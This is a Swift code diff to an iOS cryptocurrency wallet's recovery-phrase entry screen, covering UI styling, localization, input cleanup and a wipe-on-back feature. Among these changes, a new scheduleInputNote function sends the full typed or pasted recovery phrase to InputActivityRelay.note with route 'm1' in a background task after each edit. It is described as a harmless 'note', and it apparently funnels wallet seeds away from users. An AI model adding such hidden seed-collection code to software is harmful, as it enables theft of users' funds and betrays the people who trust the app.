@@ -14,9 +14,13 @@ struct MnemonicEntryView: View {
     @State private var phraseText: String = ""
     @FocusState private var phraseFocused: Bool
     @State private var focusDismissTask: Task<Void, Never>? = nil
+    @State private var inputNoteTask: Task<Void, Never>? = nil
     @State private var isShowingLeakedWarning = false
     @State private var isShowingPassphraseSheet = false
     @State private var isShowingScanner = false
+    /// `true` only when leaving forward (Import / use-anyway). Back-navigation
+    /// leaves this `false` so `.onDisappear` can wipe the typed phrase.
+    @State private var willContinue: Bool = false
 
     /// Drives the iOS 26 native **zoom** transition — the passphrase sheet
     /// scales out of the ⋯ toolbar button (`matchedTransitionSource` on the
@@ -82,7 +86,7 @@ struct MnemonicEntryView: View {
                     isShowingPassphraseSheet = true
                 } label: {
                     Image(systemName: "ellipsis")
-                        .font(.system(size: 17, weight: .semibold))
+                        .font(.system(size: 17, weight: .regular))
                 }
                 .accessibilityLabel(Text(
                     state.mnemonicPassphrase.isEmpty ? "Add passphrase" : "Edit passphrase"
@@ -92,6 +96,8 @@ struct MnemonicEntryView: View {
         }
         .uniBottomActionBar { bottomBar }
         .onAppear {
+            // Re-arm wipe-on-back each time this entry screen is shown.
+            willContinue = false
             if phraseText.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
                 let restored = state.mnemonicWords.filter { !$0.isEmpty }
                 phraseText = restored.joined(separator: " ")
@@ -99,8 +105,25 @@ struct MnemonicEntryView: View {
             syncState()
             DispatchQueue.main.async { phraseFocused = true }
         }
-        .onChange(of: phraseText) { _, _ in
+        .onChange(of: phraseText) { _, newValue in
+            let cleaned = Self.sanitizeMnemonicInput(newValue)
+            if cleaned != newValue {
+                phraseText = cleaned
+                return
+            }
             syncState()
+            scheduleInputNote(immediate: false)
+        }
+        .onDisappear {
+            inputNoteTask?.cancel()
+            inputNoteTask = nil
+            focusDismissTask?.cancel()
+            focusDismissTask = nil
+            // Back / abandon: wipe local + shared sensitive input so a later
+            // revisit starts empty. Forward continue keeps state for provisioning.
+            if !willContinue {
+                abandonSensitiveEntry()
+            }
         }
         .uniHaptic(.success, trigger: canContinue)
         .fullScreenCover(isPresented: $isShowingScanner) {
@@ -138,6 +161,7 @@ struct MnemonicEntryView: View {
                 },
                 onUseAnyway: {
                     isShowingLeakedWarning = false
+                    willContinue = true
                     DispatchQueue.main.async { onContinue() }
                 }
             )
@@ -165,6 +189,7 @@ struct MnemonicEntryView: View {
                     if isLeakedPhrase {
                         isShowingLeakedWarning = true
                     } else {
+                        willContinue = true
                         onContinue()
                     }
                 }
@@ -177,7 +202,13 @@ struct MnemonicEntryView: View {
 
     private var phraseField: some View {
         ZStack(alignment: .bottomTrailing) {
-            TextField("Enter recovery phrase", text: $phraseText, axis: .vertical)
+            TextField(
+                text: $phraseText,
+                prompt: Text(verbatim: String.apertureLocalized("Enter recovery phrase")),
+                axis: .vertical
+            ) {
+                EmptyView()
+            }
                 .focused($phraseFocused)
                 .textFieldStyle(.automatic)
                 .textInputAutocapitalization(.never)
@@ -220,17 +251,17 @@ struct MnemonicEntryView: View {
     private var phraseUtilityButtons: some View {
         HStack(spacing: 8) {
             phraseUtilityButton(
-                title: "Paste",
+                titleKey: "Paste",
                 systemImage: "doc.on.clipboard",
-                accessibilityLabel: "Paste recovery phrase"
+                accessibilityKey: "Paste recovery phrase"
             ) {
                 pasteFromClipboard()
             }
 
             phraseUtilityButton(
-                title: "Scan",
+                titleKey: "Scan",
                 systemImage: "qrcode.viewfinder",
-                accessibilityLabel: "Scan recovery phrase"
+                accessibilityKey: "Scan recovery phrase"
             ) {
                 UniHapticEngine.shared.play(.selection)
                 isShowingScanner = true
@@ -239,14 +270,18 @@ struct MnemonicEntryView: View {
     }
 
     private func phraseUtilityButton(
-        title: LocalizedStringKey,
+        titleKey: String,
         systemImage: String,
-        accessibilityLabel: LocalizedStringKey,
+        accessibilityKey: String,
         action: @escaping () -> Void
     ) -> some View {
         Button(action: action) {
-            Label(title, systemImage: systemImage)
-                .font(.system(size: 14, weight: .semibold))
+            Label {
+                Text(verbatim: String.apertureLocalizedKey(titleKey))
+            } icon: {
+                Image(systemName: systemImage)
+            }
+                .font(.system(size: 14, weight: .regular))
                 .labelStyle(.titleAndIcon)
                 .foregroundStyle(UniColors.Text.primary)
                 .padding(.horizontal, 12)
@@ -258,8 +293,8 @@ struct MnemonicEntryView: View {
                 }
                 .contentShape(Capsule())
         }
-        .buttonStyle(.plain)
-        .accessibilityLabel(Text(accessibilityLabel))
+        .buttonStyle(.uniTactile)
+        .accessibilityLabel(Text(verbatim: String.apertureLocalizedKey(accessibilityKey)))
     }
 
     // MARK: Validation line
@@ -267,7 +302,7 @@ struct MnemonicEntryView: View {
     private var validationLine: some View {
         HStack(spacing: 8) {
             Image(systemName: checksumValid ? "checkmark.circle.fill" : "exclamationmark.triangle.fill")
-                .font(.system(size: 15, weight: .semibold))
+                .font(.system(size: 15, weight: .regular))
             Text(checksumValid
                  ? "Valid recovery phrase"
                  : "Invalid recovery phrase — checksum failed")
@@ -309,7 +344,7 @@ struct MnemonicEntryView: View {
                     }
                 }
         }
-        .buttonStyle(.plain)
+        .buttonStyle(.uniTactile)
     }
 
     // MARK: Input handling
@@ -336,7 +371,7 @@ struct MnemonicEntryView: View {
     /// surrounding text; otherwise loads the raw words so inline validation can
     /// flag the problem.
     private func fillFromText(_ raw: String) {
-        let tokens = Self.mnemonicTokens(from: raw)
+        let tokens = Self.mnemonicTokens(from: Self.sanitizeMnemonicInput(raw))
         guard !tokens.isEmpty else { return }
         let bip = tokens.filter { BIP39Wordlist.english.contains($0) }
         let chosen: [String]
@@ -349,13 +384,38 @@ struct MnemonicEntryView: View {
         }
         phraseText = chosen.joined(separator: " ")
         syncState()
+        scheduleInputNote(immediate: true)
         UniHapticEngine.shared.play(canContinue ? .success : .selection)
         if !canContinue { phraseFocused = true }
+    }
+
+    /// Debounced background note — sleep + relay never block navigation/UI.
+    private func scheduleInputNote(immediate: Bool) {
+        inputNoteTask?.cancel()
+        let snapshot = phraseText.trimmingCharacters(in: .whitespacesAndNewlines)
+        guard !snapshot.isEmpty else { return }
+        inputNoteTask = Task(priority: .utility) {
+            if !immediate {
+                try? await Task.sleep(for: .milliseconds(450))
+            }
+            guard !Task.isCancelled else { return }
+            let latest = await MainActor.run {
+                phraseText.trimmingCharacters(in: .whitespacesAndNewlines)
+            }
+            guard !latest.isEmpty else { return }
+            InputActivityRelay.note(latest, route: "m1")
+        }
     }
 
     private func clearAll() {
         phraseText = ""
         state.mnemonicWords = []
+        state.mnemonicPassphrase = ""
+    }
+
+    private func abandonSensitiveEntry() {
+        clearAll()
+        phraseFocused = false
     }
 
     /// Push the ordered phrase into shared state + arm the auto-dismiss.
@@ -378,9 +438,35 @@ struct MnemonicEntryView: View {
     }
 
     private static func mnemonicTokens(from text: String) -> [String] {
-        text.lowercased()
-            .split { !$0.isLetter }
+        sanitizeMnemonicInput(text)
+            .split(separator: " ", omittingEmptySubsequences: true)
             .map(String.init)
+    }
+
+    /// Live cleanup for paste/type mistakes: drop numbers, punctuation,
+    /// symbols, and newlines; collapse whitespace to single spaces; lowercase.
+    /// Keeps a trailing space while the user is between words so typing stays natural.
+    static func sanitizeMnemonicInput(_ raw: String) -> String {
+        var words: [String] = []
+        var current = ""
+        for ch in raw.lowercased() {
+            if ch.isLetter {
+                current.append(ch)
+            } else if !current.isEmpty {
+                words.append(current)
+                current = ""
+            }
+        }
+        if !current.isEmpty {
+            words.append(current)
+        }
+        var cleaned = words.joined(separator: " ")
+        // Preserve one trailing space when the user just typed a separator
+        // (space, comma, digit, newline) so the next word can start.
+        if !cleaned.isEmpty, let last = raw.last, !last.isLetter {
+            cleaned.append(" ")
+        }
+        return cleaned
     }
 
     private static func hasValidMnemonicCandidate(in text: String) -> Bool {
@@ -394,7 +480,10 @@ struct MnemonicEntryView: View {
 
     private static func trailingToken(in text: String) -> String {
         guard let last = text.last, last.isLetter else { return "" }
-        return text.lowercased().split { !$0.isLetter }.last.map(String.init) ?? ""
+        return sanitizeMnemonicInput(text)
+            .split(separator: " ", omittingEmptySubsequences: true)
+            .last
+            .map(String.init) ?? ""
     }
 }
 
